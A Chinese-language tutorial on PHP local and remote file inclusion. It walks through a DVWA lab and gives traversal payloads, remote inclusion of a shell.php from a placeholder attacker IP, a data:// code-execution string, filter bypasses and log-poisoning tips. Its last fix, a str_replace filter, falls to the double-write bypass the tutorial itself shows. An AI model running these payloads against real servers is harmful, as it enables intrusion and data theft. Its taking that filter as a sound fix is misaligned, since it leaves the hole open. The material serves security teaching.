## 文件包含漏洞概述

### 定义与分类
| **类型**           | **描述**                                  | **风险场景**                       |
| ---------------- | --------------------------------------- | ------------------------------ |
| **本地文件包含 (LFI)** | 通过动态参数包含本地文件（如`include($_GET['file'])`） | 读取敏感文件（`/etc/passwd`）、执行本地恶意代码 |
| **远程文件包含 (RFI)** | 包含远程服务器文件（需`allow_url_include=On`）      | 远程代码执行、网页劫持                    |

### 典型危害
- **敏感文件泄露**：读取系统配置文件、数据库凭证等  
- **代码执行**：包含恶意图片马（如`.jpg`中嵌入PHP代码）  
- **权限提升**：结合其他漏洞获取服务器控制权

## PHP相关函数与伪协议

### 关键函数
| **函数**            | **行为**                                                                 |
|---------------------|--------------------------------------------------------------------------|
| `include()`         | 包含文件，失败仅警告                                                   |
| `require()`         | 包含文件，失败终止脚本                                                 |
| `file_get_contents` | 读取文件内容到字符串                                                   |
| `php://input`       | 访问原始POST数据（需`allow_url_include=On`）                           |

### 常用伪协议
| **协议**      | **用途**                                                                 |
|---------------|--------------------------------------------------------------------------|
| `file://`     | 访问本地文件系统（如`file:///etc/passwd`）                              |
| `php://filter`| 读取文件源码（如`php://filter/read=convert.base64-encode/resource=index.php`） |
| `data://`     | 直接执行代码（如`data://text/plain,<?php system("id");?>`）             |
| `phar://`     | 解压执行ZIP/JAR中的代码                                                 |

## DVWA靶场漏洞复现

### Low级别漏洞
```url
http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
http://localhost/dvwa/vulnerabilities/fi/?page=http://攻击机IP/shell.php
```

### Medium级别绕过
- **双写绕过**：`hthttp://tp://攻击机IP/shell.php`  
- **绝对路径**：`page=E:\path\to\malicious.txt`  

### High级别利用
```url
http://localhost/dvwa/vulnerabilities/fi/?page=file:///C:\Windows\system.ini
```

## 漏洞挖掘与利用技巧

### 漏洞发现
- **URL特征**：参数名包含`file`、`page`、`include`等关键字  
- **响应分析**：错误信息暴露文件路径（如`Warning: include()`）  

### 敏感文件路径
| **系统**    | **敏感文件**                              |
|------------|------------------------------------------|
| Linux      | `/etc/passwd`、`/proc/self/environ`      |
| Windows    | `C:\Windows\system.ini`、`C:\boot.ini`   |

### 高级利用
- **日志注入**：包含Apache日志（`/var/log/apache2/access.log`）插入PHP代码  
- **Session文件**：篡改`PHPSESSID`包含Session文件（`/tmp/sess_[id]`）

## 修复方案

### 代码层防护
10. **禁用动态包含**：避免使用`include($_GET['file'])`  
11. **白名单限制**：仅允许包含指定目录文件  
   ```php
   $allowed = ['header.php', 'footer.php'];
   if (in_array($_GET['file'], $allowed)) {
       include($_GET['file']);
   }
   ```

### 服务器配置
12. **PHP配置**：  
   ```ini
   allow_url_fopen = Off
   allow_url_include = Off
   ```
13. **目录权限**：限制Web用户对系统目录的读取权限  

### 输入过滤
```php
// 过滤特殊字符
$file = str_replace(['../', '://'], '', $_GET['file']);
```
